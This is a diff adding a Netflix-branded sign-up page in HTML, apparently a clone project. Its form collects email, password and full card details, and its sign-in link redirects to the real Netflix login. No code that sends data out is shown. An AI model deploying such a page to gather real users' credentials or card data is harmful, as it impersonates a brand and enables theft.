@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Sign Up</title>
+    <link rel="stylesheet" href="signup.css">
+</head>
+<body>
+    <div class="signup-container">
+        <div class="header">
+            <img src="./public/netflix_PNG25.png" class="logo" alt="Netflix Logo">
+            <a href="#" onclick="setTimeout(() => window.location.href = 'https://www.netflix.com/tr-en/login?serverState=%7B%22realm%22%3A%22growth%22%2C%22name%22%3A%22IDENTIFICATION%22%2C%22clcsSessionId%22%3A%22c03a9278-6976-43bc-9207-a32c5c3eeeba%22%2C%22sessionContext%22%3A%7B%22session-breadcrumbs%22%3A%7B%22funnel_name%22%3A%22loginWeb%22%7D%7D%7D', 10); return false;" class="signin-link">Sign In</a>
+        </div>
+        
+        <div class="signup-content">
+            <div class="signup-form">
+                <h1>Create your account</h1>
+                <p class="subtitle">Join Netflix today and start watching instantly</p>
+                
+                <form id="signupForm">
+                    <div class="step-indicator">
+                        <div class="step active">1</div>
+                        <div class="step-line"></div>
+                        <div class="step">2</div>
+                        <div class="step-line"></div>
+                        <div class="step">3</div>
+                    </div>
+                    
+                    <div class="form-step active" id="step1">
+                        <h2>Step 1 of 3: Basic Information</h2>
+                        <div class="input-group">
+                            <input type="email" id="email" placeholder="Email address" required>
+                        </div>
+                        <div class="input-group">
+                            <input type="password" id="password" placeholder="Create password" required>
+                        </div>
+                        <div class="input-group">
+                            <input type="password" id="confirmPassword" placeholder="Confirm password" required>
+                        </div>
+                        <button type="button" class="next-btn" onclick="nextStep(2)">Continue</button>
+                    </div>
+                    
+                    <div class="form-step" id="step2">
+                        <h2>Step 2 of 3: Choose Your Plan</h2>
+                        <p class="step-description">Netflix offers several plans to meet your needs</p>
+                        
+                        <div class="plan-options">
+                            <div class="plan-card" data-plan="basic">
+                                <div class="plan-header">
+                                    <h3>Basic</h3>
+                                    <div class="price">$8.99/month</div>
+                                </div>
+                                <ul class="plan-features">
+                                    <li>✓ Watch on 1 device at a time</li>
+                                    <li>✓ Standard definition (SD)</li>
+                                    <li>✓ Unlimited movies and TV shows</li>
+                                </ul>
+                            </div>
+                            
+                            <div class="plan-card popular" data-plan="standard">
+                                <div class="popular-badge">Most Popular</div>
+                                <div class="plan-header">
+                                    <h3>Standard</h3>
+                                    <div class="price">$13.99/month</div>
+                                </div>
+                                <ul class="plan-features">
+                                    <li>✓ Watch on 2 devices at a time</li>
+                                    <li>✓ High definition (HD)</li>
+                                    <li>✓ Unlimited movies and TV shows</li>
+                                    <li>✓ Download on 2 devices</li>
+                                </ul>
+                            </div>
+                            
+                            <div class="plan-card" data-plan="premium">
+                                <div class="plan-header">
+                                    <h3>Premium</h3>
+                                    <div class="price">$17.99/month</div>
+                                </div>
+                                <ul class="plan-features">
+                                    <li>✓ Watch on 4 devices at a time</li>
+                                    <li>✓ Ultra high definition (4K+HDR)</li>
+                                    <li>✓ Unlimited movies and TV shows</li>
+                                    <li>✓ Download on 6 devices</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="step-buttons">
+                            <button type="button" class="back-btn" onclick="prevStep(1)">Back</button>
+                            <button type="button" class="next-btn" onclick="nextStep(3)">Continue</button>
+                        </div>
+                    </div>
+                    
+                    <div class="form-step" id="step3">
+                        <h2>Step 3 of 3: Payment Information</h2>
+                        <p class="step-description">Complete your membership setup</p>
+                        
+                        <div class="payment-methods">
+                            <div class="payment-option selected" data-method="card">
+                                <input type="radio" name="payment" value="card" checked>
+                                <label>💳 Credit or Debit Card</label>
+                            </div>
+                            <div class="payment-option" data-method="paypal">
+                                <input type="radio" name="payment" value="paypal">
+                                <label>🔵 PayPal</label>
+                            </div>
+                        </div>
+                        
+                        <div class="payment-form" id="cardForm">
+                            <div class="input-group">
+                                <input type="text" id="cardNumber" placeholder="Card number" maxlength="19">
+                            </div>
+                            <div class="input-row">
+                                <div class="input-group">
+                                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5">
+                                </div>
+                                <div class="input-group">
+                                    <input type="text" id="cvv" placeholder="CVV" maxlength="3">
+                                </div>
+                            </div>
+                            <div class="input-group">
+                                <input type="text" id="cardName" placeholder="Name on card">
+                            </div>
+                        </div>
+                        
+                        <div class="terms">
+                            <label class="checkbox-container">
+                                <input type="checkbox" id="agreeTerms" required>
+                                <span class="checkmark"></span>
+                                I agree to the <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>
+                            </label>
+                        </div>
+                        
+                        <div class="step-buttons">
+                            <button type="button" class="back-btn" onclick="prevStep(2)">Back</button>
+                            <button type="submit" class="complete-btn">Start Membership</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="signup-benefits">
+                <h3>Why choose Netflix?</h3>
+                <div class="benefit-item">
+                    <span class="benefit-icon">📺</span>
+                    <div>
+                        <h4>Enjoy on your TV</h4>
+                        <p>Watch on Smart TVs, Playstation, Xbox, Chromecast, Apple TV, Blu-ray players, and more.</p>
+                    </div>
+                </div>
+                <div class="benefit-item">
+                    <span class="benefit-icon">📱</span>
+                    <div>
+                        <h4>Download your shows</h4>
+                        <p>Save your favorites easily and always have something to watch.</p>
+                    </div>
+                </div>
+                <div class="benefit-item">
+                    <span class="benefit-icon">🌍</span>
+                    <div>
+                        <h4>Watch everywhere</h4>
+                        <p>Stream unlimited movies and TV shows on your phone, tablet, laptop, and TV.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="signup.js"></script>
+</body>
+</html>
